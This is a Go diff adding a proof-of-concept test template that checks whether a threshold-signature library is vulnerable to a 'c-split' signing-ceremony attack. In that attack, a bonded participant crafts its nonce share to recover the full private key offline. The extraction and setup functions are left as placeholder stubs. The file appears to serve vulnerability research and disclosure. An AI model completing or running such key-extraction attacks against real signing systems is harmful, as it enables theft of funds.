@@ -1,0 +1,104 @@
+// PoC: c-split signing ceremony hijack (Thorchain 2026 root cause class).
+//
+// Class: TSSHOCK c-split. Adversary is a bonded TSS participant. In a signing
+// round, the adversary crafts its share contribution so that after aggregation
+// it can — offline, after the ceremony — recover the full private key from
+// public ceremony transcript.
+//
+// Mechanism: classic TSS share aggregation = ∑ s_i mod q. Adversary crafts
+// s_adv so that hidden subgroup structure leaks through MtA proofs. Combined
+// with weak Paillier validation = full key extraction.
+//
+// Expected outcome if BUG present:
+//   - Ceremony completes normally — produces valid signature
+//   - Adversary, having the ceremony transcript, computes private key offline
+//
+// Expected outcome if BUG absent:
+//   - MtA proofs reject adversary's malformed encryption
+//   - OR — aggregation modular reduction maskuet leak
+
+package poc
+
+import (
+	"crypto/rand"
+	"math/big"
+	"testing"
+
+	tss "<TARGET_PACKAGE>"
+)
+
+func TestPoC_CSplitCeremonyHijack(t *testing.T) {
+	threshold := 3
+	totalParties := 5
+	advIdx := <ADVERSARY_INDEX>
+
+	// Setup ceremony c (threshold + 1) participants
+	parties := setupCeremony(t, totalParties, threshold)
+
+	// Adversary crafts malicious k_adv with known structure
+	maliciousKAdv := craftStructuredK(t)
+	parties[advIdx].SetK(maliciousKAdv)
+
+	// Run signing ceremony
+	transcript := runSigningCeremony(t, parties)
+	if !transcript.Success {
+		t.Logf("[PASS] ceremony rejected adversary contribution at round %d", transcript.AbortedRound)
+		return
+	}
+
+	// Ceremony succeeded — try offline key extraction
+	t.Logf("[WARN] ceremony completed without rejection. Attempting offline key extraction...")
+	extractedKey := offlineKeyExtraction(t, transcript, maliciousKAdv)
+
+	if extractedKey != nil {
+		t.Errorf("[CRITICAL] full private key extracted from ceremony transcript")
+		t.Logf("Extracted: %s", extractedKey.D.Text(16))
+		// SUBMIT path: findings_db + immediate coordinated disclosure via SEAL 911
+	} else {
+		t.Logf("[INFO] ceremony completed but key extraction failed — partial bug only")
+	}
+}
+
+func setupCeremony(t *testing.T, n, threshold int) []*tss.LocalParty {
+	// REPLACE: standard TSS keygen+sign setup for target lib
+	return nil
+}
+
+// craftStructuredK — adversary's k_adv shaped so that after aggregation
+// public ceremony transcript leaks structural info. Specific construction
+// depends on the exact class (c-split vs c-guess vs α-shuffle).
+func craftStructuredK(t *testing.T) *big.Int {
+	// Generate k with constrained bits / specific subgroup structure
+	k, _ := rand.Int(rand.Reader, big.NewInt(0).Sub(big.NewInt(1).Lsh(big.NewInt(1), 256), big.NewInt(1)))
+	// REPLACE: actual constraint construction
+	return k
+}
+
+func runSigningCeremony(t *testing.T, parties []*tss.LocalParty) *Transcript {
+	// REPLACE: standard ceremony run, collect transcript
+	return &Transcript{Success: true}
+}
+
+type Transcript struct {
+	Success       bool
+	AbortedRound  int
+	MtAProofs     [][]byte
+	ShareCommits  [][]byte
+	FinalSig      []byte
+}
+
+func offlineKeyExtraction(t *testing.T, transcript *Transcript, maliciousK *big.Int) *tss.PrivateKey {
+	// Core c-split math:
+	// 1. We know maliciousK and see the ceremony transcript.
+	// 2. From MtAProofs we recover the encrypted k_j shares of other participants
+	//    using the factorization of malformedPaillier (if biprime bypass is also present)
+	// 3. Aggregate decrypted shares = full secret key.
+	//
+	// REPLACE: full extraction logic per specific protocol variant
+	return nil
+}
+
+// CROSS-LINK:
+//   - paillier_biprime_bypass.go.template — c-split often works IN TANDEM with biprime bypass
+//   - threat_models/tss_validator_extraction.yaml — abstract pattern
+//   - research/_papers/thorchain_2026_tsshock.md — full case study
